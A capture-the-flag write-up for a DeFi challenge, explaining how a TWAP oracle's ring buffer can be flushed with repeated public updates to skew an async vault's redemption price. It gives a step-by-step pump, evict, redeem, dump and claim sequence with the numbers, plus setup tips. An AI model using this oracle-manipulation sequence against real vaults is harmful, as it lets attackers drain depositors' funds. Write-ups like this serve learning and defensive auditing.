# Chronostasis

**Category:** Blockchain / DeFi
**Stack:** Foundry + Anvil, UniswapV2 fork, EIP-7540-style async vault, custom TWAP oracle
**One-liner:** Pump a thin pool's TWAP, snapshot the vault redemption at the high, dump the pool, claim at the low — but only after you've spammed enough oracle updates to *evict the deploy-time observation from the ring buffer*. That last step is the entire challenge.

---

## Win condition

```solidity
function isSolved() external view returns (bool) {
    return vault.totalAssetsLP() < initialVaultLPBalance;
}
```

Drain even one wei of LP from the vault. Easy to read, brutal to satisfy.

## What we're attacking

`Setup.sol` deploys:

- Three tokens: **TKA**, **TKB** (18-decimal), **TKC** (6-decimal "USD")
- Two UniswapV2 pairs:
  - **A/B "deep"** — 1,000,000 : 1,000,000
  - **B/C "thin"** — 1,000 : 1,000 (≈ \$1k notional)
- A `TWAPOracle.sol` with a per-pair ring buffer of `GRANULARITY = 8` observations and a `window = 300s`. `update(pair)` is public and unrate-limited.
- An `AsyncLPVault` over the A/B LP token, with split request/claim:
  - `requestRedeem` snapshots `pricePerShare` at request time.
  - `claimRedeem` pays out `lpOut = shares * snapshotPPS / currentLPPrice`, capped at `totalAssetsLP`.
  - `minRedeemDelay = 1`, `maxRedeemDelay = 7d`.
- Player has 10k TKA / 10k TKB / 100k TKC. The vault is seeded with ~1.1e24 LP, recorded as `initialVaultLPBalance`.

The vault prices LP using the geometric-mean fair-value formula:

```
lpPriceUSD = 2 * sqrt(rA * priceA_USD * rB * priceB_USD) / totalSupply
priceA_USD = priceA_in_B * priceB_USD / 1e18
```

So `lpPriceUSD` is **linear in `priceB_USD`**. Bend `priceB_USD` and the whole vault valuation bends with it.

## The naïve attack (and why it doesn't work)

The intended-on-paper attack is obvious:

1. Pump the thin B/C pool by swapping a pile of TKC for TKB. `priceB_USD` shoots up.
2. `requestRedeem` — vault snapshots the high PPS.
3. Wait past `minRedeemDelay`, then swap TKB back for TKC. `priceB_USD` craters.
4. `claimRedeem` — `lpOut = shares * (HIGH / LOW)`, which clamps to the entire vault.

But the price the vault reads is a **TWAP**, not spot. And here's where I burned the first hour: the obvious pump-then-snap, even with a few `oracle.update()` calls in between, barely moves the snapshot price at all.

## The real bug: `_consult` anchors on observations *outside* the window

Reading `_consult` carefully:

```solidity
// walk newest -> oldest
for (uint256 i = idx; ; ) {
    Observation memory obs = observations[pair][i];
    if (obs.timestamp >= targetTime && obs.timestamp <= newest.timestamp) {
        oldest = obs; // update — still inside window
    } else if (obs.timestamp < targetTime) {
        oldest = obs; // FIRST obs before the window — anchor here
        break;        // and STOP looking
    }
    // ...
}
```

The loop will happily anchor on **any single observation older than the window** and stop there. So if `Setup`'s deploy-time observation (`obs0`, with `cum = 0`) sits even minutes before the window, the TWAP becomes:

```
TWAP = (cum_new − 0) / (ts_new − ts_obs0)
```

i.e. the cumulative price gets averaged over the entire deploy-to-now span. Your beautiful 5000× pump gets diluted by minutes of baseline price. You see basically no TWAP movement.

## The fix: evict the deploy-time observation

The ring is 8 slots. Each `update(pair)` writes one new observation (subject to a `1s` min spacing). So **8 post-pump updates fully overwrite `obs0`**, and the search now terminates with `oldest = obs1` — the post-pump observation. The TWAP collapses to the manipulated spot.

Same trick mirrored for the dump phase.

## Working attack sequence

In one block:

```python
# Phase 0 — get some LP into the vault, ours.
approve(TKA, router); approve(TKB, router); approve(TKC, router)
router.addLiquidity(TKA, TKB, 100e18, 100e18, ...)   # ≈100e18 LP
pairAB.approve(vault); vault.deposit(LP)              # shares = 100e18
oracle.update(pairAB)  # AB needs ≥2 obs for _consult

# Phase 1 — pump B/C
router.swapExactTokensForTokens(TKC -> TKB, 70_000 USD, ...)  # B/C ≈ 5000x up
oracle.update(pairBC)                  # post-pump obs0_new
for _ in range(7):
    evm_increaseTime(30); evm_mine
    oracle.update(pairBC)              # 8 post-pump updates → evicts deploy obs
oracle.update(pairAB)                  # fresh AB obs inside window
vault.requestRedeem(shares, player, player)  # snapshot at TWAP_high

# Phase 2 — dump
evm_increaseTime(1); evm_mine          # past minRedeemDelay
router.swapExactTokensForTokens(TKB -> TKC, all_TKB, ...)   # B/C ≈ 100x down
oracle.update(pairBC)
for _ in range(7):
    evm_increaseTime(30); evm_mine
    oracle.update(pairBC)              # 8 post-dump updates → evicts pump obs
oracle.update(pairAB)
vault.claimRedeem(0)                   # lpOut clamped to totalAssetsLP
```

## Numbers

- 70k TKC into B/C → `r_TKB ≈ 100·1e18`, `r_TKC ≈ 71_000·1e6` → spot ≈ 5e-9 raw, vs baseline 1e-12 → **~5000×**.
- All ~10,900 TKB into B/C → spot collapses **~100×** below baseline.
- `priceB_USD` swing snapshot/claim ≈ `5e9 / 1e4 = 5e5` (in 1e18 fixed point).
- `lpPriceUSD_snap / lpPriceUSD_claim ≈ 5e5`.
- `lpOut = shares · 5e5 = 100e18 · 5e5 = 5e25 wei` (raw), clamped to `totalAssetsLP ≈ 1.1e24`.

Post-claim `totalAssetsLP ≈ 0`, `isSolved` returns true.

## Practical orchestration notes

These eat hours if you don't know them:

- The launcher is `nc <host> 7000`, menu option **[2] Launch new instance**, then paste the **team token**. RPC port is reported as `http://<host>:70xx` but **doesn't bind until deploy finishes**. Poll `eth_getCode(setup)` until non-`0x` (~15–30s).
- **Keep the `nc` TCP session open** until the exploit completes. Closing it tears the instance down.
- The Anvil is plain Anvil — no `vm.warp`. Time travel is `evm_increaseTime` + `evm_mine` over JSON-RPC. (`anvil_setNextBlockTimestamp` works once you're past the current ts.)
- `_consult` on the AB pair also needs ≥ 2 observations AND a newest observation inside the window. Call `oracle.update(pairAB)` right before both `requestRedeem` and `claimRedeem` or it'll revert.
- Use `cast send --legacy` everywhere. EIP-1559 quirks on this Anvil instance.
- I orchestrated from a Python wrapper that owns the `nc` socket so the menu stays alive across the multi-step exploit. Anything that exits early closes the socket and kills your instance.

## Why this bug exists

Three small decisions compose into the win:

1. The TWAP oracle ring is public-write with no rate limit.
2. The ring is only 8 slots — overwriting it costs essentially nothing.
3. The vault locks one TWAP at request time and pays out against a second, separately-skewable TWAP at claim time.

Remove any one of those and the attack collapses. Together, the vault is paying out shares against a price it lets the attacker draw on the back of a napkin.
